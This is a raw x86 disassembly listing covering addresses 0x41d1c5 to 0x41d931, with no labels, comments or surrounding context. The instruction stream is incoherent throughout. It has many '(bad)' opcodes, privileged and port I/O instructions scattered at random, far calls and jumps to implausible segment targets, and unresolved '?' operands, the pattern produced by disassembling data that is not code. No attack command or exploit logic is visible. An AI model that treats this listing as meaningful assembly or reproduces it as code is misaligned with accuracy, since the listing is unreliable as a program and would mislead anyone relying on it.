  41d1c5:	mov    BYTE PTR [edi+eiz*2-0x5f],0x17
  41d1ca:	push   edi
  41d1cb:	add    DWORD PTR [edx],0x8affab74
  41d1d1:	sahf   
  41d1d2:	div    esi
  41d1d4:	nop
  41d1d5:	cmp    BYTE PTR [ebx-0x2f34bb9],cl
  41d1db:	mov    al,ds:0x24f9e871
  41d1e0:	inc    esp
  41d1e1:	sub    BYTE PTR [ecx],dh
  41d1e3:	and    eax,0xbaf4535c
  41d1e9:	hlt    
  41d1ea:	enter  0x2262,0xd9
  41d1ee:	lahf   
  41d1ef:	imul   edi,DWORD PTR [esi],0x5b
  41d1f2:	add    cl,BYTE PTR gs:[esi-0x23436d1b]
  41d1f9:	adc    eax,0x8960c53d
  41d1fe:	out    0xe0,eax
  41d200:	add    al,0x72
  41d202:	xchg   BYTE PTR [edi],bh
  41d204:	or     BYTE PTR [ebp+ebx*1+0x4],ch
  41d208:	test   al,0xf3
  41d20a:	mov    esp,gs
  41d20c:	dec    esi
  41d20d:	or     BYTE PTR [ebx+0x211470ae],bl
  41d213:	int    0xd9
  41d215:	jg     0x41d1cf
  41d217:	cmp    dh,ch
  41d219:	sahf   
  41d21a:	adc    eax,0xe25a7c1
  41d21f:	sub    dh,BYTE PTR [ebp+0x13]
  41d222:	rol    BYTE PTR [ebp+edx*2+0x4b2f0726],cl
  41d229:	cmp    DWORD PTR ds:0x5b9886a,eax
  41d22f:	dec    edx
  41d230:	or     cl,BYTE PTR [edi-0x1699e075]
  41d236:	outs   dx,BYTE PTR ds:[esi]
  41d237:	sub    al,0x1c
  41d239:	dec    edi
  41d23a:	ss sahf 
  41d23c:	icebp  
  41d23d:	push   edi
  41d23e:	cld    
  41d23f:	ins    DWORD PTR es:[edi],dx
  41d240:	out    0xdf,al
  41d242:	inc    esp
  41d243:	adc    eax,0x4e517391
  41d248:	test   DWORD PTR [edx-0xdd27636],eax
  41d24e:	push   ecx
  41d24f:	int    0xe3
  41d251:	push   ds
  41d252:	fstp   TBYTE PTR [eax+0x5d]
  41d255:	and    al,0xef
  41d257:	add    ah,ch
  41d259:	jge    0x41d2d0
  41d25b:	fdiv   DWORD PTR [ecx-0x42]
  41d25e:	lea    edx,[ebp-0x31483265]
  41d264:	lahf   
  41d265:	sti    
  41d266:	dec    edi
  41d267:	fcmovbe st,st(2)
  41d269:	jge    0x41d25f
  41d26b:	icebp  
  41d26c:	sub    esp,eax
  41d26e:	adc    eax,0xd03cc73b
  41d273:	mov    esp,0x435d118
  41d278:	loopne 0x41d228
  41d27a:	cs ja  0x41d234
  41d27d:	adc    BYTE PTR [ecx-0x58],dl
  41d280:	int    0xb1
  41d282:	xlat   BYTE PTR ds:[ebx]
  41d283:	sub    DWORD PTR [edi],ebp
  41d285:	neg    dl
  41d287:	and    DWORD PTR [esi+0x46],esp
  41d28a:	xchg   ebx,eax
  41d28b:	jnp    0x41d22f
  41d28d:	xor    BYTE PTR [ebx+0x19],dl
  41d290:	jb     0x41d2f7
  41d292:	cdq    
  41d293:	sbb    al,BYTE PTR [ebx+0x20]
  41d296:	sbb    al,0x14
  41d298:	data16 cmc 
  41d29a:	shr    BYTE PTR [ebp-0x37],1
  41d29d:	imul   ebx,DWORD PTR [eax+0x20],0x62
  41d2a1:	pop    edi
  41d2a2:	hlt    
  41d2a3:	xor    eax,0x7d524226
  41d2a8:	and    eax,DWORD PTR [edi+edi*8]
  41d2ab:	pop    ecx
  41d2ac:	jbe    0x41d316
  41d2ae:	jg     0x41d247
  41d2b0:	inc    ecx
  41d2b1:	inc    ebx
  41d2b2:	push   ebp
  41d2b3:	fist   WORD PTR [edi-0x40c0d6ec]
  41d2b9:	inc    ebp
  41d2ba:	xor    DWORD PTR [bp+si+0x50e8],ecx
  41d2bf:	adc    dl,BYTE PTR [ebx]
  41d2c1:	call   0x9ca3:0x8d9cee8f
  41d2c8:	movaps xmm0,XMMWORD PTR [esi]
  41d2cb:	inc    esp
  41d2cc:	out    dx,eax
  41d2cd:	stos   BYTE PTR es:[edi],al
  41d2ce:	aaa    
  41d2cf:	mov    esi,0xe98ad3d6
  41d2d4:	pushf  
  41d2d5:	jmp    0x41d281
  41d2d7:	in     eax,0x82
  41d2d9:	jne    0x41d347
  41d2db:	mov    ch,0x70
  41d2dd:	cmp    BYTE PTR [ebx+0x59],dl
  41d2e0:	arpl   bx,sp
  41d2e2:	mov    ecx,0xcce68f81
  41d2e7:	loopne 0x41d350
  41d2e9:	xchg   ebx,eax
  41d2ea:	dec    esi
  41d2eb:	mov    eax,DWORD PTR [eax]
  41d2ed:	mov    esp,0xbfda7651
  41d2f2:	sti    
  41d2f3:	je     0x41d338
  41d2f5:	mov    dl,0x0
  41d2f7:	mov    bh,0x6d
  41d2f9:	pop    esp
  41d2fa:	inc    ecx
  41d2fb:	push   es
  41d2fc:	jmp    0xf373:0x9160b480
  41d303:	adc    eax,0xbca52674
  41d308:	jmp    0x17d:0x3c767d0
  41d30f:	push   DWORD PTR [ebp-0x7012e163]
  41d315:	jb     0x41d2b9
  41d317:	inc    eax
  41d318:	adc    eax,ebp
  41d31a:	xchg   edx,eax
  41d31b:	shr    DWORD PTR [esi-0x167b80d8],cl
  41d321:	mov    dl,0x37
  41d323:	(bad)  
  41d324:	aad    0xf4
  41d326:	js     0x41d2fb
  41d328:	mov    ch,bh
  41d32a:	repz sbb ebp,DWORD PTR [ecx]
  41d32d:	pop    esp
  41d32e:	pop    esi
  41d32f:	push   ss
  41d330:	lea    eax,[edi+0x6]
  41d333:	adc    DWORD PTR [eax-0x7c],esi
  41d336:	or     al,0xb
  41d338:	loop   0x41d341
  41d33a:	cli    
  41d33b:	cwde   
  41d33c:	pop    ebx
  41d33d:	mov    ds:0x9b7b204e,eax
  41d342:	mov    esp,0xfa035585
  41d347:	cld    
  41d348:	sub    eax,0x51d4d360
  41d34d:	sbb    eax,0x4cdc9b2c
  41d352:	adc    edx,DWORD PTR ds:0x20b40dbf
  41d358:	cmc    
  41d359:	cmp    bh,BYTE PTR [ecx-0x45d045f5]
  41d35f:	test   ebx,edi
  41d361:	inc    ecx
  41d362:	sbb    al,0xe6
  41d364:	ret    0x4b1e
  41d367:	popf   
  41d368:	shl    bh,0xba
  41d36b:	or     dl,BYTE PTR [ecx+0x2595b0e7]
  41d371:	mov    edi,0xf65689ce
  41d376:	jne    0x41d34a
  41d378:	popa   
  41d379:	rcl    BYTE PTR [ecx-0x72],cl
  41d37c:	xor    al,0xad
  41d37e:	sub    al,0x22
  41d380:	(bad)  
  41d381:	popf   
  41d382:	or     DWORD PTR [esi],0xffffffad
  41d385:	nop
  41d386:	sbb    BYTE PTR [esi],dh
  41d388:	rcr    BYTE PTR [ebx+0x754f399e],0xac
  41d38f:	dec    bl
  41d391:	dec    ebx
  41d392:	shr    BYTE PTR [ecx],0x3
  41d395:	push   ebp
  41d396:	adc    edx,eax
  41d398:	jg     0x41d379
  41d39a:	retf   
  41d39b:	shl    edx,1
  41d39d:	pushf  
  41d39e:	dec    esp
  41d39f:	lea    ecx,[edi+0x54]
  41d3a2:	inc    edx
  41d3a3:	jg     0x41d385
  41d3a5:	inc    esi
  41d3a6:	jg     0x41d3e8
  41d3a8:	sahf   
  41d3a9:	adc    BYTE PTR [edx+0x4e],0xe5
  41d3ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3ae:	mov    ah,ch
  41d3b0:	mov    edx,DWORD PTR [ebx+0x65]
  41d3b3:	mov    DWORD PTR [edx+0x8e98172],ebx
  41d3b9:	loope  0x41d376
  41d3bb:	pop    ss
  41d3bc:	cmc    
  41d3bd:	in     eax,dx
  41d3be:	xchg   ebx,eax
  41d3bf:	imul   esi,DWORD PTR [ebx+0x43c3cdc],0x46
  41d3c6:	cmp    al,0xcc
  41d3c8:	mov    ?,WORD PTR [edx]
  41d3ca:	push   ds
  41d3cb:	fstp   DWORD PTR [ecx-0x5c]
  41d3ce:	xor    BYTE PTR [ebp-0x688add26],ah
  41d3d4:	jmp    0x324f:0xb896d416
  41d3db:	push   ds
  41d3dc:	jmp    0x41d3d9
  41d3de:	mov    eax,0xe5d3bc5c
  41d3e3:	mov    al,0x9c
  41d3e5:	fistp  WORD PTR [edi+0x3684c302]
  41d3eb:	cmp    ah,BYTE PTR [edx-0x51e42d99]
  41d3f1:	fidiv  DWORD PTR [eax+0x309e0418]
  41d3f7:	pop    ds
  41d3f8:	jg     0x41d3d9
  41d3fa:	stos   BYTE PTR es:[edi],al
  41d3fb:	push   ebp
  41d3fd:	shr    DWORD PTR ds:0x99f6c015,cl
  41d403:	jno    0x41d390
  41d405:	cli    
  41d406:	call   0x4bce:0xb1117864
  41d40d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d40e:	and    esi,DWORD PTR [edx-0x5]
  41d411:	scas   eax,DWORD PTR es:[edi]
  41d412:	cli    
  41d413:	inc    edi
  41d414:	dec    esp
  41d415:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d416:	repz cmp bh,bl
  41d419:	jmp    0x41d452
  41d41b:	adc    ebx,0xe38055c0
  41d421:	outs   dx,DWORD PTR ds:[esi]
  41d422:	xor    eax,0x6c2e1de6
  41d427:	inc    esp
  41d428:	pop    edx
  41d429:	adc    eax,DWORD PTR [edi+0x67]
  41d42c:	adc    bl,dh
  41d42e:	int3   
  41d42f:	cmp    cl,BYTE PTR [ebx]
  41d431:	sbb    esp,ecx
  41d433:	or     cl,al
  41d435:	jecxz  0x41d426
  41d437:	mov    esp,0x322c7d64
  41d43c:	pop    esp
  41d43d:	je     0x41d454
  41d43f:	jg     0x41d3dd
  41d441:	rcl    BYTE PTR [ecx],cl
  41d443:	mov    cl,ah
  41d445:	pop    ss
  41d446:	daa    
  41d447:	cmp    dl,BYTE PTR [bp+di+0x53]
  41d44b:	imul   DWORD PTR [edi]
  41d44d:	nop
  41d44e:	ret    
  41d44f:	std    
  41d450:	or     eax,ebx
  41d452:	add    DWORD PTR [ebx],edx
  41d454:	nop
  41d455:	mov    DWORD PTR [edx-0x4c],esp
  41d458:	arpl   WORD PTR [ecx],sp
  41d45a:	inc    eax
  41d45b:	mov    edx,0x2256e844
  41d460:	aas    
  41d461:	aad    0xaf
  41d463:	sahf   
  41d464:	mov    dl,0xa2
  41d466:	leave  
  41d467:	cmp    bl,BYTE PTR [esi+eax*1+0x2]
  41d46b:	xor    ch,ch
  41d46d:	cmc    
  41d46e:	ror    DWORD PTR [edx-0x4a27aa93],0xf6
  41d475:	cmp    al,BYTE PTR [esi]
  41d477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d478:	mov    di,0x7059
  41d47c:	fisttp DWORD PTR [edx-0x685f0b21]
  41d482:	inc    edx
  41d483:	jp     0x41d4d2
  41d485:	jl     0x41d4c4
  41d487:	mov    eax,ds:0xd28bd16f
  41d48c:	(bad)  
  41d48d:	jns    0x41d4f5
  41d48f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d490:	mov    DWORD PTR [ebx+0x50],esi
  41d493:	ss inc ecx
  41d495:	sub    ch,bh
  41d497:	xchg   ebx,eax
  41d498:	add    al,BYTE PTR [edx-0x11]
  41d49b:	addr16 lahf 
  41d49d:	ins    BYTE PTR es:[edi],dx
  41d49e:	push   cs
  41d49f:	stos   DWORD PTR es:[edi],eax
  41d4a0:	test   cl,ch
  41d4a2:	cmp    eax,0xcf9ef274
  41d4a7:	push   esp
  41d4a8:	push   edx
  41d4a9:	vpunpckhwd xmm4,xmm5,XMMWORD PTR [ecx+0x148e8fcf]
  41d4b1:	adc    ah,BYTE PTR [edx+edx*4-0x79]
  41d4b5:	add    eax,0x7d4fa844
  41d4ba:	adc    BYTE PTR [ebp-0xc64370d],cl
  41d4c0:	xchg   ecx,eax
  41d4c1:	cli    
  41d4c2:	clc    
  41d4c3:	mov    dh,0x99
  41d4c5:	xchg   BYTE PTR [eax],bl
  41d4c7:	dec    esp
  41d4c8:	mov    ah,0x6d
  41d4ca:	mov    esi,0xd26744be
  41d4cf:	push   ebp
  41d4d0:	mov    ds:0xa2b8968a,eax
  41d4d5:	mov    al,0x10
  41d4d7:	mov    dl,0xf1
  41d4d9:	stc    
  41d4da:	cdq    
  41d4db:	or     ebx,esi
  41d4dd:	add    bl,BYTE PTR [ecx-0x24]
  41d4e0:	ins    DWORD PTR es:[edi],dx
  41d4e1:	cmc    
  41d4e2:	loope  0x41d557
  41d4e4:	aad    0xc0
  41d4e6:	mov    eax,ds:0xbb9690e1
  41d4eb:	mov    ds:0x27e1ceaa,al
  41d4f0:	inc    edi
  41d4f1:	ss out 0x7e,eax
  41d4f4:	xor    bl,BYTE PTR [ebx+0xa]
  41d4f7:	cwde   
  41d4f8:	popa   
  41d4f9:	mov    ds:0x2ba926dc,eax
  41d4fe:	mov    dh,0x13
  41d500:	and    al,0xfd
  41d502:	mov    ds:0x15477736,al
  41d507:	in     eax,0x18
  41d509:	retf   
  41d50a:	aam    0x8a
  41d50c:	ins    DWORD PTR es:[edi],dx
  41d50d:	inc    edi
  41d50e:	rcr    DWORD PTR [ebp+0x5],cl
  41d511:	jbe    0x41d53e
  41d513:	mov    bl,0x37
  41d515:	jb     0x41d4a6
  41d517:	call   0xa588:0x946d9d7a
  41d51e:	call   0x3f853742
  41d523:	add    ch,al
  41d525:	and    eax,0xa4d90beb
  41d52a:	popa   
  41d52b:	es iret 
  41d52d:	(bad)  
  41d52e:	fsub   DWORD PTR [ebp-0x20b067d4]
  41d534:	shr    bh,cl
  41d536:	lods   al,BYTE PTR ds:[esi]
  41d537:	mov    eax,ds:0xc528066d
  41d53c:	nop
  41d53d:	repnz call 0x104b:0xc6a8795a
  41d545:	lods   eax,DWORD PTR ds:[esi]
  41d546:	les    edi,FWORD PTR [esi]
  41d548:	or     BYTE PTR [edx+0x6d],dh
  41d54b:	sti    
  41d54c:	or     al,0x9d
  41d54e:	in     al,0x8d
  41d550:	pop    esi
  41d551:	iret   
  41d552:	mov    cl,0x64
  41d554:	inc    esp
  41d555:	jmp    0x12b9148d
  41d55a:	add    bh,bh
  41d55c:	sbb    al,0xf6
  41d55e:	fwait
  41d55f:	enter  0xbe4d,0xc0
  41d563:	popa   
  41d564:	outs   dx,DWORD PTR ds:[esi]
  41d565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d566:	jmp    0x41d4fd
  41d568:	or     edx,edx
  41d56a:	imul   edi,DWORD PTR [ebp+0x3b],0xffffffca
  41d56e:	ds ins DWORD PTR es:[edi],dx
  41d570:	add    dl,ah
  41d572:	and    BYTE PTR [edx+0x79a71cd7],dh
  41d578:	fwait
  41d579:	imul   ebp,DWORD PTR [eax-0x7c5f60e9],0x3daa741
  41d583:	mov    ebp,0x4931f4b
  41d588:	xchg   ebx,eax
  41d589:	data16 mov al,0xc2
  41d58c:	sti    
  41d58d:	and    dh,cl
  41d58f:	fs in  al,0x83
  41d592:	mov    edi,edx
  41d594:	inc    ecx
  41d595:	or     al,0x95
  41d597:	inc    eax
  41d598:	dec    ebp
  41d599:	cmp    BYTE PTR [esi-0x3e6b4087],0xb
  41d5a0:	hlt    
  41d5a1:	out    dx,eax
  41d5a2:	cmp    DWORD PTR [ebp+edx*1+0x37],0xffffffbd
  41d5a7:	push   cs
  41d5a8:	cmp    eax,ebx
  41d5aa:	pop    esi
  41d5ab:	pop    ebp
  41d5ac:	ret    0x45dd
  41d5af:	pop    eax
  41d5b0:	xor    esi,DWORD PTR [eax+0x29]
  41d5b3:	mov    ebp,ecx
  41d5b5:	aas    
  41d5b6:	xchg   ecx,eax
  41d5b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5b8:	jns    0x41d53e
  41d5ba:	scas   eax,DWORD PTR es:[edi]
  41d5bb:	aam    0xbd
  41d5bd:	daa    
  41d5be:	call   0x444341c8
  41d5c3:	mov    ecx,0xeba51dbc
  41d5c8:	call   0x28b9:0x9c7e6196
  41d5cf:	jmp    0x41d5f2
  41d5d1:	sub    bh,dl
  41d5d3:	mov    esp,0xd997a5b3
  41d5d8:	push   ss
  41d5d9:	xlat   BYTE PTR ds:[ebx]
  41d5da:	popa   
  41d5db:	jns    0x41d5c3
  41d5dd:	jl     0x41d5f7
  41d5df:	loopne 0x41d619
  41d5e1:	cs js  0x41d5e7
  41d5e4:	pop    esi
  41d5e5:	cdq    
  41d5e6:	cmp    al,0xc3
  41d5e8:	loope  0x41d607
  41d5ea:	xor    DWORD PTR ds:0x17787866,0x786cabe1
  41d5f4:	mov    eax,ds:0xca47c9f2
  41d5f9:	sbb    al,BYTE PTR [edi+0x43]
  41d5fc:	push   cs
  41d5fd:	ror    ah,0x1f
  41d600:	popf   
  41d601:	or     ebp,ebp
  41d603:	mov    al,0xf
  41d605:	ss hlt 
  41d607:	or     ecx,esi
  41d609:	push   eax
  41d60a:	or     al,0xcf
  41d60c:	and    BYTE PTR [edi],dl
  41d60e:	cmp    DWORD PTR [edx-0x7820ff93],edi
  41d614:	lods   al,BYTE PTR ds:[esi]
  41d615:	or     BYTE PTR [edi-0x30],dh
  41d618:	sbb    edi,DWORD PTR [edx]
  41d61a:	mov    ds:0x46c6032d,al
  41d61f:	repz lahf 
  41d621:	mov    ebx,0xf73aee5c
  41d626:	mov    bh,0xe2
  41d628:	outs   dx,BYTE PTR ds:[esi]
  41d629:	or     esi,esi
  41d62b:	add    al,0x3
  41d62d:	xor    BYTE PTR [esi],0x3
  41d630:	add    al,0x8a
  41d632:	inc    ebx
  41d633:	mov    ah,0x13
  41d635:	mov    DWORD PTR [ecx],ebx
  41d637:	pushf  
  41d638:	or     al,0xa9
  41d63a:	in     eax,0x7e
  41d63c:	nop
  41d63d:	(bad)  
  41d63e:	(bad)  
  41d640:	rol    DWORD PTR [edi+0x6347344d],0x41
  41d647:	icebp  
  41d648:	and    eax,0xa8d5cb07
  41d64d:	xchg   edi,eax
  41d64e:	jo     0x41d6b4
  41d650:	mov    DWORD PTR [eax+0x7112438],edi
  41d656:	int    0xec
  41d658:	sbb    cl,BYTE PTR [edx]
  41d65a:	mov    bh,0x54
  41d65c:	call   0x39817f1d
  41d661:	xchg   edi,eax
  41d662:	sbb    al,0xf5
  41d664:	pop    ebx
  41d665:	pop    ds
  41d666:	jo     0x41d608
  41d668:	or     esp,ebx
  41d66a:	int    0xb1
  41d66c:	retf   0xc9f4
  41d66f:	dec    edi
  41d670:	and    eax,0x8aabf1ea
  41d675:	mov    DWORD PTR [ebx],ebx
  41d677:	into   
  41d678:	jle    0x41d695
  41d67a:	stos   DWORD PTR es:[edi],eax
  41d67b:	mov    ebp,0x737db92c
  41d680:	sbb    edx,0x56
  41d683:	cwde   
  41d684:	(bad)  
  41d685:	rcr    BYTE PTR [esi+0x2986f8b2],0xe8
  41d68c:	fstp   TBYTE PTR ds:0x57d4feca
  41d692:	dec    esp
  41d693:	push   ebp
  41d694:	pushf  
  41d695:	mov    bl,0x7d
  41d697:	xor    al,dl
  41d699:	outs   dx,BYTE PTR ds:[esi]
  41d69a:	dec    ebp
  41d69b:	xchg   esi,eax
  41d69c:	pop    ds
  41d69d:	call   0x83f9:0x1785c05b
  41d6a4:	sub    ecx,DWORD PTR [edx-0x65]
  41d6a7:	lods   al,BYTE PTR ds:[esi]
  41d6a8:	push   es
  41d6a9:	push   ds
  41d6aa:	enter  0xe954,0x9a
  41d6ae:	adc    DWORD PTR [edx+0x758c0d71],edx
  41d6b4:	in     al,dx
  41d6b5:	mov    ds:0xff932317,eax
  41d6ba:	pop    eax
  41d6bb:	rol    DWORD PTR [eax+0x7145d384],0xff
  41d6c2:	and    DWORD PTR [eax+0x65],eax
  41d6c5:	(bad)  
  41d6c6:	xchg   esp,eax
  41d6c7:	fwait
  41d6c8:	in     al,0xc6
  41d6ca:	mov    bl,0xf8
  41d6cc:	dec    ebx
  41d6cd:	scas   al,BYTE PTR es:[edi]
  41d6ce:	outs   dx,DWORD PTR ds:[esi]
  41d6cf:	xor    ah,ch
  41d6d1:	inc    esi
  41d6d2:	int3   
  41d6d3:	or     eax,0x3c72049c
  41d6d8:	stc    
  41d6d9:	jmp    0x41d688
  41d6db:	dec    edi
  41d6dc:	and    edx,esp
  41d6de:	pushf  
  41d6df:	pop    es
  41d6e0:	sub    al,0xf9
  41d6e2:	data16 or bh,bh
  41d6e5:	mov    eax,ds:0xec036611
  41d6ea:	inc    esi
  41d6eb:	xor    al,0xb3
  41d6ed:	(bad)  
  41d6ee:	ret    0xa98d
  41d6f1:	fist   WORD PTR [edi+ebp*2]
  41d6f4:	push   ebp
  41d6f5:	and    ebx,DWORD PTR [ebx+0x53]
  41d6f8:	or     ah,bh
  41d6fa:	mov    ss,ecx
  41d6fc:	sub    ecx,ebx
  41d6fe:	and    esi,DWORD PTR [ebp-0x206159bd]
  41d704:	stc    
  41d705:	push   ecx
  41d706:	call   0x501a9fc8
  41d70b:	mov    ebp,0xe8ab76bd
  41d710:	cli    
  41d711:	adc    al,0xe3
  41d713:	add    al,0xe1
  41d715:	xor    eax,0x205730cf
  41d71a:	pop    ebp
  41d71b:	push   edx
  41d71c:	call   0x1a7f:0x988aae45
  41d723:	fimul  WORD PTR [edi]
  41d725:	adc    dh,BYTE PTR [ebp-0x8d46459]
  41d72b:	cmp    DWORD PTR [esi+ebx*8],0xec6b1260
  41d732:	and    ecx,ebx
  41d734:	push   0xffffffa6
  41d736:	stos   DWORD PTR es:[edi],eax
  41d737:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d738:	adc    edx,DWORD PTR [eax-0x4b68726f]
  41d73e:	mov    ds:0xc1efa1fc,eax
  41d743:	in     eax,0xa7
  41d745:	push   ecx
  41d746:	mov    bl,0x28
  41d748:	cmp    eax,0xc8cdc314
  41d74d:	aam    0xcc
  41d74f:	test   DWORD PTR [edx],ecx
  41d751:	sbb    dh,0x9e
  41d754:	adc    BYTE PTR cs:[edx+0x7c],0xd7
  41d759:	repnz inc edx
  41d75b:	sub    edx,DWORD PTR [edi]
  41d75d:	and    al,0x6d
  41d75f:	out    0xc9,al
  41d761:	dec    esi
  41d762:	test   DWORD PTR [eax+0x7],0x7831cb06
  41d769:	lock sar BYTE PTR [ebx-0x110c9e7f],cl
  41d770:	jmp    0x68811b4d
  41d775:	dec    ebp
  41d776:	mov    cl,0x5e
  41d778:	xchg   edi,eax
  41d779:	pop    ebp
  41d77a:	inc    eax
  41d77b:	mov    dl,0x1e
  41d77d:	mov    edx,0xc4a57ad9
  41d782:	clc    
  41d783:	scas   eax,DWORD PTR es:[edi]
  41d784:	lods   eax,DWORD PTR ds:[esi]
  41d785:	jecxz  0x41d7ca
  41d787:	fsubr  QWORD PTR [ebx+0x2a]
  41d78a:	xchg   BYTE PTR [ebx-0x58],ah
  41d78d:	xor    ah,ch
  41d78f:	(bad)  
  41d790:	jnp    0x41d782
  41d792:	inc    eax
  41d793:	lock enter 0x9cb4,0xeb
  41d798:	pop    ecx
  41d799:	cli    
  41d79a:	imul   eax,DWORD PTR [edi+eiz*2+0x59de7432],0x24
  41d7a2:	dec    ecx
  41d7a3:	nop
  41d7a4:	ret    
  41d7a5:	pushf  
  41d7a6:	clc    
  41d7a7:	pop    eax
  41d7a8:	jg     0x41d7f6
  41d7aa:	xchg   ecx,eax
  41d7ab:	xor    BYTE PTR [esi-0x7b06a76f],dh
  41d7b1:	dec    BYTE PTR [ecx-0x17]
  41d7b4:	scas   al,BYTE PTR es:[edi]
  41d7b5:	sbb    eax,0x3280cd0
  41d7ba:	mov    ebp,0xaf2a4530
  41d7bf:	loope  0x41d7c8
  41d7c1:	sbb    al,0xbe
  41d7c3:	daa    
  41d7c4:	(bad)  
  41d7c5:	(bad)  
  41d7c6:	dec    esp
  41d7c7:	test   BYTE PTR [esi-0x6a918c64],0xe1
  41d7ce:	xchg   ebx,eax
  41d7cf:	iret   
  41d7d0:	test   eax,0x8aff9733
  41d7d5:	popa   
  41d7d6:	fiadd  WORD PTR [edx-0xf]
  41d7d9:	cdq    
  41d7da:	scas   al,BYTE PTR es:[edi]
  41d7db:	pusha  
  41d7dc:	mov    DWORD PTR [eax-0x19],edx
  41d7df:	scas   eax,DWORD PTR es:[edi]
  41d7e0:	loop   0x41d834
  41d7e2:	scas   al,BYTE PTR es:[edi]
  41d7e3:	scas   eax,DWORD PTR es:[edi]
  41d7e4:	aas    
  41d7e5:	mov    ds,WORD PTR [edx]
  41d7e7:	or     al,0x73
  41d7e9:	mov    edi,0xc540c809
  41d7ee:	lahf   
  41d7ef:	jbe    0x41d7ab
  41d7f1:	dec    edi
  41d7f2:	sub    BYTE PTR [ebx+0x11],ch
  41d7f5:	cwde   
  41d7f6:	inc    ebp
  41d7f7:	jl     0x41d7bd
  41d7f9:	mov    fs,esi
  41d7fb:	retf   
  41d7fc:	(bad)  
  41d7fd:	cmp    dh,ch
  41d7ff:	ret    0xf367
  41d802:	fcom   QWORD PTR [ebx+0x6e]
  41d805:	psubusw mm5,QWORD PTR [edi+0x19]
  41d809:	xchg   ebp,eax
  41d80a:	adc    al,0x91
  41d80c:	test   DWORD PTR [eax],esi
  41d80e:	adc    ecx,esi
  41d810:	jp     0x41d7a9
  41d812:	dec    edi
  41d813:	ins    DWORD PTR es:[edi],dx
  41d814:	xor    cl,BYTE PTR [ebx-0x2b]
  41d817:	mov    esi,0xc8d5cc59
  41d81c:	fwait
  41d81d:	cmp    eax,0x7f469ce9
  41d822:	sub    al,0xcc
  41d824:	retf   
  41d825:	adc    eax,0x5ece6bbc
  41d82a:	lea    esi,[edx+0x147128a8]
  41d830:	mov    edi,0x13dbc55e
  41d835:	mov    cl,0xd2
  41d837:	pop    ebp
  41d838:	mov    ah,0xf2
  41d83a:	mov    ?,WORD PTR [ebp-0x55744275]
  41d840:	jno    0x41d850
  41d842:	imul   ecx,DWORD PTR [esi+0x2],0x4fa98f32
  41d849:	pop    esi
  41d84a:	cmp    ah,0x41
  41d84d:	es (bad) 
  41d84f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d850:	inc    edi
  41d851:	xor    DWORD PTR [eax+0x49a83b7d],esi
  41d857:	pop    ebp
  41d858:	bound  esi,QWORD PTR [edi]
  41d85a:	fldenv [esi+ecx*2-0x36]
  41d85e:	out    0x5b,eax
  41d860:	call   0xef20:0xee6e1dda
  41d867:	pop    ss
  41d868:	fidivr WORD PTR [edx-0x6]
  41d86b:	daa    
  41d86c:	fild   QWORD PTR [esi]
  41d86e:	mov    eax,0xaa711866
  41d873:	cld    
  41d874:	repnz or DWORD PTR [eax+0x66],ecx
  41d878:	shr    DWORD PTR [ebp+0x71153f55],cl
  41d87e:	mov    ecx,edx
  41d880:	sub    eax,0x3464c017
  41d885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d886:	inc    edi
  41d887:	cmp    BYTE PTR [eax-0x2819cd67],0x94
  41d88e:	pop    ss
  41d88f:	sti    
  41d890:	(bad)  
  41d891:	out    0x29,eax
  41d893:	out    0xee,al
  41d895:	xchg   ecx,eax
  41d896:	and    eax,0xd3730032
  41d89b:	add    DWORD PTR [ecx-0x3c8dcb29],ecx
  41d8a1:	push   ds
  41d8a2:	jb     0x41d860
  41d8a4:	in     al,dx
  41d8a5:	push   eax
  41d8a6:	pop    ebp
  41d8a7:	addr16 (bad) 
  41d8a9:	sti    
  41d8aa:	and    al,0xe
  41d8ac:	gs sub eax,0x26b8f6c2
  41d8b2:	int    0x5e
  41d8b4:	mov    ebp,0xc700f47c
  41d8b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8ba:	dec    esi
  41d8bb:	mov    ?,WORD PTR [edx-0x7]
  41d8be:	std    
  41d8bf:	mov    eax,ds:0x29e8d97e
  41d8c4:	out    dx,eax
  41d8c5:	mov    esi,DWORD PTR [ecx+ebp*4-0x4495b964]
  41d8cc:	neg    DWORD PTR [edi-0x43d15fa7]
  41d8d2:	test   eax,0x7fcbc596
  41d8d7:	(bad)  
  41d8d9:	jg     0x41d8ed
  41d8db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8dc:	repz push eax
  41d8de:	int3   
  41d8df:	pop    es
  41d8e0:	scas   al,BYTE PTR es:[edi]
  41d8e1:	inc    ecx
  41d8e2:	mov    ah,0xa9
  41d8e4:	adc    al,0x20
  41d8e6:	xchg   DWORD PTR [ecx-0x386c1ef2],ebp
  41d8ec:	stos   DWORD PTR es:[edi],eax
  41d8ed:	xchg   esi,eax
  41d8ee:	mov    ebx,0xbc1d52cf
  41d8f3:	and    al,0x4d
  41d8f5:	stos   BYTE PTR es:[edi],al
  41d8f6:	push   ebp
  41d8f7:	or     bh,BYTE PTR [ecx-0x34]
  41d8fa:	ror    BYTE PTR [eax+0x32],cl
  41d8fd:	push   cs
  41d8fe:	pop    ss
  41d8ff:	cmp    DWORD PTR ds:0xbca40fca,ecx
  41d905:	lock dec esp
  41d907:	dec    ecx
  41d908:	inc    eax
  41d909:	rcl    dh,1
  41d90b:	shl    bl,cl
  41d90d:	fisttp DWORD PTR [edx+0xa]
  41d910:	mov    ah,0x62
  41d912:	xchg   esi,eax
  41d913:	xor    ebx,DWORD PTR [ecx+edi*1+0x6e]
  41d917:	sub    eax,DWORD PTR [ebp-0x7bdd42e]
  41d91d:	xor    BYTE PTR [edx+edx*2+0x38],dl
  41d921:	(bad)  
  41d922:	pop    esp
  41d923:	fstp   TBYTE PTR [ebx]
  41d925:	push   esp
  41d926:	test   BYTE PTR [eax-0x50],ch
  41d929:	mov    ecx,0x1e997b6b
  41d92e:	outs   dx,DWORD PTR ds:[esi]
  41d92f:	sahf   
  41d930:	lods   al,BYTE PTR ds:[esi]
  41d931:	add    eax,0x39b197fc
